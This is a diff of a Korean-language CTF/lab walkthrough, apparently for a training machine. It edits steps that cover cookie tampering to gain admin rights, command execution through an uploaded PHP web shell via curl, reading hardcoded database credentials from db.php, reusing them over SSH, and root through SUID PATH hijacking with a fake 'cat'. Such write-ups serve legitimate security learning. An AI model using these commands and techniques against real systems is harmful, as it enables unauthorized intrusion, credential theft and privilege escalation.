@@ -117,7 +117,7 @@ id=1 조회 결과 admin의 Access ID가 **34322**임을 확인했다. 서버는
 
 페이지를 새로고침하면 서버는 조작된 쿠키를 그대로 신뢰하고 admin 권한으로 처리한다.
 
-![Uploads 페이지 활성화](images/uploads-page-admin.png)
+![Uploads 페이지 활성화](images/uploads-page-guest.png)
 
 쿠키 조작 후 Uploads 메뉴에 접근하면 파일 업로드 폼이 활성화된다.
 
@@ -153,10 +153,10 @@ curl "http://$IP/uploads/shell.php?cmd=id"
 
 ### 9. 서버 파일 구조 파악 및 DB 크리덴셜 탈취
 
-권한 상승 경로를 탐색하기 위해 웹루트 내 PHP 파일 목록을 확인했다. 소스 파일, 특히 DB 연결 파일에는 크리덴셜이 하드코딩되는 경우가 많다.
+현재 RCE 권한은 `www-data`로 제한적이다. 권한 상승을 위해서는 더 높은 권한을 가진 계정의 크리덴셜이 필요하다. 웹 애플리케이션의 소스 파일, 특히 DB 연결 파일에는 크리덴셜이 하드코딩되는 경우가 많으므로 웹루트 내 PHP 파일 목록을 확인했다.
 
 ```bash
-curl "http://10.129.17.161/uploads/shell.php?cmd=find+/var/www/html+-name+'*.php'"
+curl "http://$IP/uploads/shell.php?cmd=find+/var/www/html+-name+'*.php'"
 ```
 
 ![PHP 파일 목록](images/rce-find-php-files.png)
@@ -164,12 +164,12 @@ curl "http://10.129.17.161/uploads/shell.php?cmd=find+/var/www/html+-name+'*.php
 `/var/www/html/cdn-cgi/login/db.php`가 존재한다. 해당 파일의 내용을 확인했다.
 
 ```bash
-curl "http://10.129.17.161/uploads/shell.php?cmd=cat+/var/www/html/cdn-cgi/login/db.php"
+curl "http://$IP/uploads/shell.php?cmd=cat+/var/www/html/cdn-cgi/login/db.php"
 ```
 
 ![db.php 크리덴셜 확인](images/rce-cat-dbphp-credentials.png)
 
-`mysqli_connect('localhost', 'robert', 'M3g4C0rpUs3r!', 'garage')` — robert 계정의 패스워드가 소스 파일에 평문으로 하드코딩되어 있었다. 이 크리덴셜이 SSH 계정에도 재사용되었을 가능성을 확인하기로 했다.
+`mysqli_connect('localhost', 'robert', 'M3g4C0rpUs3r!', 'garage')` — robert 계정의 패스워드가 소스 파일에 평문으로 하드코딩되어 있었다. 개발자들은 편의상 DB 크리덴셜을 시스템 계정에 동일하게 재사용하는 경우가 많으므로, 이 패스워드로 SSH 접속을 시도하기로 했다.
 
 ---
 
@@ -178,12 +178,12 @@ curl "http://10.129.17.161/uploads/shell.php?cmd=cat+/var/www/html/cdn-cgi/login
 획득한 크리덴셜(`robert / M3g4C0rpUs3r!`)로 SSH 접속을 시도했다.
 
 ```bash
-ssh robert@10.129.17.161
+ssh robert@$IP
 ```
 
 ![SSH 접속 성공](images/ssh-login-robert.png)
 
-접속에 성공했다. DB 크리덴셜이 시스템 계정에도 재사용된 경우다.
+접속에 성공했다. DB 크리덴셜이 시스템 계정에 그대로 재사용된 경우로, 서비스 계정과 시스템 계정의 크리덴셜을 분리하지 않은 것이 원인이다.
 
 ---
 
@@ -239,7 +239,7 @@ strings /usr/bin/bugtracker
 
 ### 13. PATH 하이재킹으로 root 쉘 획득
 
-공격 원리는 다음과 같다. bugtracker는 SUID로 인해 root 권한으로 실행되며, 내부에서 `cat`을 상대 경로로 호출한다. `/tmp`에 `/bin/sh`를 실행하는 가짜 `cat`을 만들고 PATH 앞에 `/tmp`를 추가하면, bugtracker가 `/bin/cat` 대신 `/tmp/cat`을 root 권한으로 실행한다.
+공격 원리는 다음과 같다. Linux에서 명령을 상대 경로로 호출하면 OS는 PATH 환경변수에 등록된 디렉토리를 순서대로 탐색해 해당 이름의 실행 파일을 찾는다. bugtracker는 SUID로 인해 root 권한으로 실행되며, 내부에서 `cat`을 상대 경로로 호출한다. `/tmp`에 `/bin/sh`를 실행하는 가짜 `cat`을 만들고 PATH 앞에 `/tmp`를 추가하면, OS가 `/bin/cat`보다 `/tmp/cat`을 먼저 발견해 root 권한으로 실행한다.
 
 ```bash
 echo '/bin/sh' > /tmp/cat
